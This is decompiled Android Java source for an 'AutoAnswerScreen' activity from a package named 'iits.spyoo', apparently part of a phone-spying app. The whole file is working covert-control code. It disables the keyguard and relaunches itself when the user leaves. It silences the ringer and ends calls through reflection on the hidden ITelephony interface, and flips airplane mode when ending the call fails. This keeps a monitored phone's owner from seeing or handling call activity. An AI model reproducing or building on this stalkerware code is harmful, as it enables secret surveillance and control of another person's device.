package iits.spyoo;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import com.android.internal.telephony.ITelephony;
import iits.mamager.FileManager;
import java.lang.reflect.Method;

public class AutoAnswerScreen extends Activity {
    private static final String TAG = "AutoAnswerScreen";
    private boolean flagEndCall = false;
    private boolean flagRestartScreen = true;
    private KeyguardManager mKeyGuardManager;
    private KeyguardManager.KeyguardLock mLock;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        getWindow().addFlags(128);
        this.mKeyGuardManager = (KeyguardManager) getSystemService("keyguard");
        this.mLock = this.mKeyGuardManager.newKeyguardLock(TAG);
        this.mLock.disableKeyguard();
        setContentView(R.layout.autoanswerscreen);
    }

    public void onPause() {
        super.onPause();
        if (this.flagRestartScreen) {
            Intent intent = getIntent();
            intent.setFlags(268435456);
            finish();
            startActivity(intent);
        }
    }

    public void onStop() {
        super.onStop();
        try {
            if (!this.flagEndCall) {
                setAirplaneMode(getApplicationContext(), false);
            }
        } catch (Exception e) {
        }
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        super.onKeyDown(keyCode, event);
        this.flagRestartScreen = false;
        try {
            stopIncomingCall(getApplicationContext());
            Thread.sleep(3000);
            finish();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onKeyDown function: " + e.toString());
        }
        return false;
    }

    private void setAirplaneMode(Context context, boolean isEnabled) {
        Settings.System.putInt(context.getContentResolver(), "airplane_mode_on", isEnabled ? 1 : 0);
        Intent intent = new Intent("android.intent.action.AIRPLANE_MODE");
        intent.putExtra("state", isEnabled);
        sendBroadcast(intent);
    }

    private void stopIncomingCall(Context context) throws Exception {
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        if (tm.getCallState() == 2) {
            Method m = Class.forName(tm.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            m.setAccessible(true);
            ITelephony telephonyService = (ITelephony) m.invoke(tm, new Object[0]);
            telephonyService.silenceRinger();
            this.flagEndCall = telephonyService.endCall();
            if (!this.flagEndCall) {
                setAirplaneMode(getApplicationContext(), true);
            }
        }
    }

    public void onUserLeaveHint() {
        this.flagRestartScreen = false;
        try {
            stopIncomingCall(getApplicationContext());
            Thread.sleep(3000);
            finish();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onUserLeaveHint function: " + e.toString());
        }
    }
}
